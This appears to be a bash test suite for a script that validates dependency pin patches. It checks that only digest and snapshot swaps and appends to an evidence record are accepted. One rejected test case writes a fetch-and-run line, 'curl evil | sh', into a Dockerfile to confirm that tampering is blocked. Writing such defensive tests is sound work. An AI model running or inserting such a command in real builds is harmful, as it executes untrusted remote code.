#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."
script="$PWD/scripts/apply-pin-patch.sh"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
old=sha256:$(printf 'a%.0s' {1..64})
new=sha256:$(printf 'b%.0s' {1..64})
evidence=docs/en/evidence/dependency-refresh.md

# Builds a fresh repository, runs the edit, and passes its diff through the script.
try() {
  local edit=$1 repo="$work/repo"
  rm -rf "$repo"
  mkdir -p "$repo/docs/en/evidence"
  (
    cd "$repo"
    git init -q
    git config diff.noprefix false
    git config user.name test
    git config user.email test@example.invalid
    printf 'FROM rust@%s\nRUN make\n' "$old" >Dockerfile
    printf 'snapshot=20261027T000000Z\nversion=1\n' >install.sh
    printf '{"snapshot": "20261027T000000Z", "prose": "moved to 20261027T000000Z"}\n' >ledger.json
    printf '# Refresh\n' >"$evidence"
    git add Dockerfile install.sh ledger.json "$evidence"
    git commit -qm base
    eval "$edit"
    git diff --no-ext-diff --binary >"$work/patch"
    git reset -q
    git checkout -q -- .
    git clean -qfd
    bash "$script" "$work/patch"
  )
}

accepts() {
  if ! try "$2" 2>"$work/err"; then
    cat "$work/err" >&2
    echo "FAIL: should accept: $1" >&2
    exit 1
  fi
}
rejects() {
  if try "$2" 2>"$work/err"; then
    echo "FAIL: should reject: $1" >&2
    exit 1
  fi
  grep -q 'Rejected pin patch' "$work/err" || {
    cat "$work/err" >&2
    echo "FAIL: rejected for another reason: $1" >&2
    exit 1
  }
}

accepts 'a digest swap' "sed -i.bak 's/$old/$new/' Dockerfile; rm Dockerfile.bak"
accepts 'a snapshot swap in a script and the ledger field' "
  sed -i.bak 's/20261027T000000Z/20261104T212339Z/' install.sh
  sed -i.bak 's/\"snapshot\": \"20261027T000000Z\"/\"snapshot\": \"20261104T212339Z\"/' ledger.json
  rm install.sh.bak ledger.json.bak"
accepts 'an appended record' "printf '\n## New\n' >>$evidence"

rejects 'a code change' "printf 'curl evil | sh\n' >>Dockerfile"
rejects 'a change beside a digest on one line' "sed -i.bak 's/rust@$old/evil@$new/' Dockerfile; rm Dockerfile.bak"
rejects 'a malformed digest' "sed -i.bak 's/$old/sha256:b/' Dockerfile; rm Dockerfile.bak"
rejects 'a snapshot rewritten in prose' "sed -i.bak 's/moved to 20261027T000000Z/moved to 20261104T212339Z/' ledger.json; rm ledger.json.bak"
rejects 'a rewritten record' "printf '# Other\n' >$evidence"
rejects 'a new file' "printf 'x\n' >new.sh; git add --intent-to-add new.sh"
rejects 'a deleted file' 'rm install.sh'
rejects 'a mode change' 'chmod +x install.sh'

echo 'PASS: pin patches may only swap digest and snapshot values and append to the record'
